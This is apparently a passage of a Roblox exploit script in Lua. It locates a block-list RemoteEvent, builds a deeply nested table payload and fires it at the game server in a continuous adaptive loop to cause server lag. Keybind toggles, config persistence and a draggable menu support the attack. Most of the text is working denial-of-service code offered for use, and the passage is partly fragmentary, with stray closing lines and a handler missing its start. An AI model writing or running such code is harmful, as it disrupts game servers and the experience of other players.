local function findRemote()
    if remote and remote.Parent then return remote end
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    for _, name in ipairs({
        "SetPlayerBlockList", "UpdatePlayerBlockList",
        "SetBlockList", "UpdateBlockList"
    }) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then
            remote = r
            return r
        end
    end
    for _, c in ipairs(rrs:GetChildren()) do
        if c:IsA("RemoteEvent") and c.Name:find("Block") then
            remote = c
            return c
        end
    end
    return nil
end

local function saveConfig()
    if not writefile then return end
    pcall(function()
        writefile(CONFIG_FILE, HttpService:JSONEncode({
            Power1 = State.Power1, Power2 = State.Power2,
            Delay = State.Delay, Keybind = State.KeyName,
            GamepadKeybind = State.GamepadKeyName,
            AntiLag = State.AntiLag, AutoBrainrot = State.AutoBrainrot,
        }))
    end)
end

local function loadConfig()
    if not readfile or not isfile then return end
    if not isfile(CONFIG_FILE) then return end
    local ok, d = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(d) ~= "table" then return end
    if tonumber(d.Power1) then State.Power1 = tonumber(d.Power1) end
    if tonumber(d.Power2) then State.Power2 = tonumber(d.Power2) end
    if tonumber(d.Delay) then State.Delay = math.max(MIN_DELAY, tonumber(d.Delay)) end
    if type(d.Keybind) == "string" and d.Keybind ~= "" then
        State.KeyName = d.Keybind
        local ok2, k = pcall(function() return Enum.KeyCode[d.Keybind] end)
        if ok2 and k then State.Keybind = k end
    end
    if type(d.GamepadKeybind) == "string" and d.GamepadKeybind ~= "" and d.GamepadKeybind ~= "NONE" then
        State.GamepadKeyName = d.GamepadKeybind
        local ok3, gk = pcall(function() return Enum.KeyCode[d.GamepadKeybind] end)
        if ok3 and gk then State.GamepadKeybind = gk end
    end
    State.AntiLag = d.AntiLag == true
    State.AutoBrainrot = d.AutoBrainrot == true
end

local function buildPayload(power)
    local main    = {}
    local nested  = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local fireThread
local running = false

local function setLag(state)
    state = state and true or false
    if state == running then return true end

    if state then
        if not remote or not remote.Parent then
            remote = findRemote()
        end
        if not remote then return false end
    end

    running = state
    State.Running = state

    if fireThread then pcall(task.cancel, fireThread) end
    fireThread = nil

    if state then
        local power = math.floor(
            State.ActivePower == 1 and State.Power1 or State.Power2
        )
        local baseDelay = math.max(MIN_DELAY, State.Delay)
        local payload = buildPayload(power)

        fireThread = task.spawn(function()
            local currentDelay = baseDelay
            local cycles = 0
            while running do
                if not remote or not remote.Parent then
                    remote = findRemote()
                    if not remote then
                        task.wait(0.5)
                        continue
                    end
                end
                local ok = pcall(function()
                    remote:FireServer(payload)
                end)
                if not ok then
                    currentDelay = math.min(currentDelay * 1.5, 0.5)
                else
                    currentDelay = math.max(currentDelay * 0.995, baseDelay * 0.5)
                end
                cycles = cycles + 1
                task.wait(currentDelay)
            end
        end)
    end
    return true
end

    end

    if UserInputService:GetFocusedTextBox() then return end
    if State.Keybind and input.KeyCode == State.Keybind then
        applyLagState(not running)
    end
end)

local function makeDraggable(frame, handle)
    handle = handle or frame
    local dragging, dragStart, startPos
    handle.InputBegan:Connect(function(input)
        if locked then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if not dragging then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch then
            local d = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y
            )
        end
    end)
end
